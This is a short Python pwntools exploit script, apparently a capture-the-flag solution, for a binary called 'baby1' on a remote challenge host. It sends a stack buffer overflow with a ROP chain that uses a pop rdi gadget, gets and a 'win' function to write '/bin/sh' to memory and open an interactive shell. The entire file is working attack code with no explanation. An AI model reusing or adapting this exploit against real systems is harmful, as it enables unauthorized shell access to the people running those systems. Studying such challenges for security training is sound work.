from pwn import *

p = remote("baby-01.pwn.beer", 10001)
#p = process("./baby1")
#gdb.attach(p)

p.recvuntil("input:")

buf = ""
buf += cyclic_find("gaaahaaaiaaaj") * "A"

# some misc area to write /bin/sh
bin_sh_ptr = 0x602000

#0x0000000000400793: pop rdi; ret;
pop_rdi_ret = p64(0x400793)

buf += pop_rdi_ret
buf += p64(bin_sh_ptr)
buf += p64(0x400580) # gets

buf += pop_rdi_ret
buf += p64(bin_sh_ptr)
buf += p64(0x400698) # win

p.sendline(buf)

p.sendline("/bin/sh\x00")

p.interactive()
